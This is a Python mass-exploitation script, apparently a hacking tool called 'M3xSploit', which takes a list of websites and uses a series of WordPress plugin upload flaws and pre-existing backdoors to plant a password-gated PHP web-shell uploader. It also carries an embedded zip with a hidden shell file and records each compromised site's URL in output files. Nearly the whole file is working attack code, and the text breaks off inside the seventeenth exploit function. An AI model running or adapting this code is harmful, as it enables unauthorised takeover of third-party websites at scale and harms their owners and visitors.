import requests
import colorama
import multiprocessing.dummy
import json
colorama.init()
requests.urllib3.disable_warnings()
uploaderContent = """
<?php
error_reporting(0); 
if ($_GET['y3suf'] == '1453'){
    echo 'M3xSploitV1<br>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
} 
?>
"""
zipByteContent = b"PK\x03\x04\x14\x00\x00\x00\x08\x00I\x94\xe8V\xf7\xe8H~\x08\x01\x00\x00o\x01\x00\x00\n\x00\x00\x00.Y3suf.php]\x90Mk\x840\x14E\xf7\x82\xff!\x84\xc2Sh\x9d\x0e\xd3\xae\xfc\x98n\xa6\xa5\xd0/p\xda\x8d\x95\x90\xd1X\x03jBLJE\xfc\xef\x8dUJiV\xc9\xb9\x97\xc3{\x89\xf6\xb2\x96\xae\xc3\x94\x12\x8a(&\x85\xd2\xbc\xfb\xf0.\xfd\x10\xb9\x0e\xaf\x90wF\xee\x0e\xc7\x0c\x86]o*\xc8Q\x1c#\xd8^]\xef\xc0\x1f]\x07\xd9\xc3\x8aZ x\xdc}\xa5\xb2\x11\\\xbfm\xa3\x93J \xb0Vb:\xda2\xcf\x0f\xf0{\x87\x03\xb0|\x93D\x95P-j\x99\xaeE\x19c)z\x8d\x11\xeb\n=H\x16\xe3\xd64\x9aK\xaa\xf4fn]\x94TS\x9cD\xbc\x93F\xa3\xa5Q\xf1\x86a4kcL\xc8o\xb8\x02\xbc\xb6zsj\xb9\x15\x7f\xd2\xc6\xd8\xe7\xab\x1d\x8c\x96\xb6\xfc\xa3M \xe4\x95\xdd\xea\xe59=\xfa\xa3\xbd\xde\x14B\x0e\x16\xdc\xde?\x1c\xd2\x0c\x08\x81<\x03\xddJ2[!?G\xff\xa2\x05\xfb\xfe\xb8l\xbe\xd8Y\t\xe1\xc4\x9a\x9e\xad\xf4Ih\xf4'\x99\\g\xb2\xff\xb9O\xbe\x01PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x00I\x94\xe8V\xf7\xe8H~\x08\x01\x00\x00o\x01\x00\x00\n\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00.Y3suf.php\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xdf\xc56\xa9\xb1\xb1\xd9\x01\xdf\xc56\xa9\xb1\xb1\xd9\x01\x11=\xa8=\xa4\xb1\xd9\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\\\x00\x00\x000\x01\x00\x00\x00\x00"
headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}
def banner():
    banner = f"""
    
  {colorama.Fore.RED}__  __ ____        _____       _       _ _   
 {colorama.Fore.LIGHTWHITE_EX}|  \/  |___ \      / ____|     | |     (_) |  
 {colorama.Fore.RED}| \  / | __) |_  _| (___  _ __ | | ___  _| |_ 
 {colorama.Fore.LIGHTWHITE_EX}| |\/| ||__ <\ \/ /\___ \| '_ \| |/ _ \| | __|
 {colorama.Fore.RED}| |  | |___) |>  < ____) | |_) | | (_) | | |_ 
 {colorama.Fore.LIGHTWHITE_EX}|_|  |_|____//_/\_\_____/| .__/|_|\___/|_|\__|
                          {colorama.Fore.RED}| |               
                          {colorama.Fore.LIGHTWHITE_EX}|_| {colorama.Fore.BLUE}Discord {colorama.Fore.LIGHTWHITE_EX}: @exz3r0.                
    """
    print(banner)
def site_listesi_oku():
    while True:
        try:
            urls_input = input(colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Website List"+colorama.Fore.RED+" : "+colorama.Fore.LIGHTWHITE_EX)
            return [i.strip() for i in open(urls_input, "r").readlines()]
            break
        except FileNotFoundError:
            print(colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"!"+colorama.Fore.LIGHTWHITE_EX+"] File Not Found "+colorama.Fore.RED+": "+colorama.Fore.LIGHTWHITE_EX+urls_input)
            continue
        except KeyboardInterrupt:
            exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
        except Exception as e:
            pass
def http_ekle(url):
    if 'http://' not in url and 'https://' not in url:
        url = 'http://' + url
    return url
def VULN_1(url):
    try:
        data = {"allowed_file_types" : "php,jpg,jpeg,php,txt","upload" : json.dumps({"dir" : "../"})}
        files = {"files[]":("Y3suf.php",uploaderContent)}
        path = url + "/wp-admin/admin-ajax.php?action=_ning_upload_image"
        uploaded = url + "/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 1 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 1 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_2(url):
    try:
        data = {"1" : "Y3suf.php"}
        files = {"userfile":("Y3suf.php",uploaderContent)}
        path = url + "/wp-content/plugins/ioptimization/IOptimize.php?rchk"
        uploaded = url + "/wp-content/plugins/ioptimization/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 2 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 2 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_3(url):
    try:
        data = {'password': 'yanz', 'submit': '>>', 'a': 'fm', 'p': 'uploadFile', 'ch': 'Windows-1251'}
        files = {"f":("Y3suf.php",uploaderContent)}
        path = url + "/repeater.php"
        uploaded = url + "/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 3 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 3 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_4(url):
    try:
        data = {'password': 'yanz', 'submit': '>>', 'a': 'fm', 'p': 'uploadFile', 'ch': 'Windows-1251'}
        files = {"f":("Y3suf.php",uploaderContent)}
        path = url + "/wp-content/updates.php"
        uploaded = url + "/wp-content/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 4 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 4 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_5(url):
    try:
        path = url + "/wp-content/updates.php#cfwk"
        get = requests.get(path,headers=headers,verify=False,timeout=5)
        if 'input type="submit" name="submit" value="  >>"' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 5 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Shells.txt","a").write(path+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 5 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_6(url):
    try:
        path = url + "/repeater.php#yanz"
        get = requests.get(path,headers=headers,verify=False,timeout=5)
        if 'input type="submit" name="submit" value="  >>"' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 6 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Shells.txt","a").write(path+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 6 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_7(url):
    try:
        files = {"filename":("Y3suf.php",uploaderContent,"text/html")}
        path = url + "/wp-content/plugins/apikey/apikey.php"
        uploaded = url + "/wp-content/plugins/apikey/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 7 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 7 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_8(url):
    try:
        data = {'action':'revslider_ajax_action','client_action':'update_plugin'}
        files = {'update_file':("Y3suf.php", uploaderContent, 'text/html')}
        path = url + "/wp-admin/admin-ajax.php"
        uploaded = url + "/wp-content/plugins/revslider/temp/update_extract/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 8 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 8 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_9(url):
    try:
        files = {"file":("Y3suf.php",uploaderContent)}
        path = url + "/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
        uploaded = url + "/wp-content/plugins/cherry-plugin/admin/import-export/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 9 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 9 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_10(url):
    try:
        data = {"filename":"Y3suf.php"}
        files = {'file':("Y3suf.php", uploaderContent)}
        path = url + "/wp-content/plugins/wp-engine-module/wp-engine.php"
        uploaded = url + "/wp-content/plugins/wp-engine-module/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 10 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 10 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_11(url):
    try:
        data = {"pass":"lufix", 'a': 'FilesMan', 'p1': 'uploadFile','ne':'', 'charset': 'UTF-8'}
        files = {'f[]':("Y3suf.php", uploaderContent)}
        path = url + "/wp-config-sample.php"
        uploaded = url + "/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 11 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 11 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_12(url):
    try:
        uploaded = url + "/wp-includes/js/tinymce/skins/lightgray/img/index.php?p="
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if '<title>Tiny File Manager</title>' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 12 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Shells.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 12 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_13(url):
    try:
        uploaded = url + "/index.php?3x=3x"
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if '<title>Upload files...</title>' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 13 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 13 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_14(url):
    try:
        files = {"file":("Y3suf.php",uploaderContent)}
        data = {"_upl":"Upload"}
        path = url + "/wp-content/plugins/background-image-cropper/ups.php"
        uploaded = url + "/wp-content/plugins/background-image-cropper/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 14 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 14 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_15(url):
    try:
        files = {"file":("Y3suf.php",uploaderContent)}
        data = {"_upl":"Upload"}
        path = url + "/wp-content/plugins/background-image-cropper/ups.php"
        uploaded = url + "/wp-content/plugins/background-image-cropper/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 15 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 15 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_16(url):
    try:
        files = {'file': ("Y3suf", zipByteContent)}
        data = {'action': 'add_custom_font'}
        post = requests.post(url + "/wp-admin/admin-ajax.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/uploads/typehub/custom/Y3suf/.Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/uploads/typehub/custom/Y3suf/.Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 16 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 16 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_17(url):
    try:
        files = {'fonticonzipfile': ("Y3suf", zipByteContent)}
        data = {'action': 'uploadFontIcon', 'fontsetname': "Y3suf", 'fonticonzipfile': 'uploadFontIcon'}
        post = requests.post(url + "/wp-admin/admin-ajax.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/uploads/kaswara/fonts_icon/Y3suf/.Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/uploads/kaswara/fonts_icon/Y3suf/.Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 17 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
